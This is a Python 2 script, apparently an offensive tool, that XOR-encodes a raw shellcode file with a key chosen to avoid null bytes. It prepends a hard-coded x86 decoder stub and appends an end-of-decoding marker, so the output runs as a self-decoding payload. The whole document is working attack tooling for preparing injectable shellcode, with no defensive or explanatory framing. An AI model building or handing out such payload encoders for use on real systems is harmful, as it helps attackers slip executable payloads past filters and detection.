#!/usr/bin/python

# This script reads binary file specified in first
# parameter and then encodes every byte by simply
# XORing it with custom value (specified in second param)
# and writes output to another file.
# If second parameter wasn't specified (i.e XOR argument)
# then 0xAA is taken by default. In addition it prepends shellcode
# with simple decoding routine and appends decode-end marker
# if needed.

import sys
import struct
from random import randint

XOR = 0xAA

if len(sys.argv) < 2:
	print "Usage: encshell.py <shellcode> <XOR> [-s] [-f]"
	print "\t-s - prevents appending/prepending shellcode with anything"
	print "\t-f - force using selected key"
	exit(1)

prev = 0
force = 0

if len(sys.argv) > 3:
	XOR = int(sys.argv[2],16)

	if len(sys.argv) == 4:
		if sys.argv[3] == '-s':
			prev = 1
		elif sys.argv[3] == '-f':
			force = 1

	if len(sys.argv) == 5:
		if sys.argv[4] == '-s':
			prev = 1
		elif sys.argv[4] == '-f':
			force = 1

f = open(sys.argv[1], 'rb')
bin = f.read()
print "[+] Input read: %d bytes." % len(bin)
f.close()

# Checking if this XOR value can be used

fa = False
while True:
	f = False
	for a in bin:
		byte = struct.unpack("B", a)[0]
		if byte == XOR and force == 0:
			if fa == False:
				print "[!] Value 0x%02X cannot be used as a XOR value\n"\
						"\tbecause it occures in input file (xor will " \
						"result with 00)" % XOR
				fa = True

			if len(sys.argv) == 3:
				exit(1)
			else:
				XOR = randint( 1, 255)
				print "\t- trying with 0x%02X..." % XOR
				f = True
				break
	if f:
		continue
	else:
		break

bAppendMarker = False

if bin[-4:] != "\xDE\xC0\xDE\xAB":
	bAppendMarker = True

file = sys.argv[1][:-4]+"_enc"+sys.argv[1][-4:]

g = open(file, 'wb')

print "[+] XORing each byte by 0x%02X" % XOR


decode =	"\xEB\x12\x5B\x89\xDA\x80\x33"
decode +=	struct.pack("B", XOR)
decode +=	"\x43\x81\x7B\xFC\xDE\xC0\xDE\xAB" \
			"\x75\xF3\xFF\xE2\xE8\xE9\xFF\xFF" \
			"\xFF"

if prev == 0:
	print "[+] Shellcode is being prepended with %d bytes "\
			"of decode routine"	% len(decode)
	g.write(decode)

for a in bin:
	# XORing
	b = struct.unpack("B", a)[0]
	byte = b ^ XOR
	g.write(struct.pack("B", int(byte)))

if bAppendMarker == True and prev == 0:
	b1 = 0xAB ^ XOR
	b2 = 0xDE ^ XOR
	b3 = 0xC0 ^ XOR
	b4 = 0xDE ^ XOR
	g.write(struct.pack("BBBB", b4,b3,b2,b1 ))
	print "[+] Appending 0x%02X%02X%02X%02X (0xABDEC0DE) " \
			"end-of-decoding marker" % (b1,b2,b3,b4)

g.close()

print "[+] %s generated." % file

